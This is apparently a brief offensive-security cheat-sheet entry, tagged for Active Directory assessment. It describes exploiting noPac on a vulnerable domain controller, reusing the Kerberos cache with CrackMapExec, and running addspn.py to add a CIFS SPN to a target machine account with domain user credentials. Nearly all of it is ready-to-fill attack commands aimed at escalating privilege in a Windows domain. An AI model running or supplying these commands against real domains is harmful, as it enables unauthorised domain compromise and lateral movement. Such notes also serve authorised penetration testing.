# addSPN

## Add a SPN
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 

Exploit noPac on a vulnerable domain controller.
After successful exploit :
    $ cme smb $DC --use-kcache

```bash
addspn.py -t "<final_target>$" --spn "cifs/<spn_target>" -u "<domain>"/"<user>" -p "<password>" -c 'DomainController.domain.local'
```
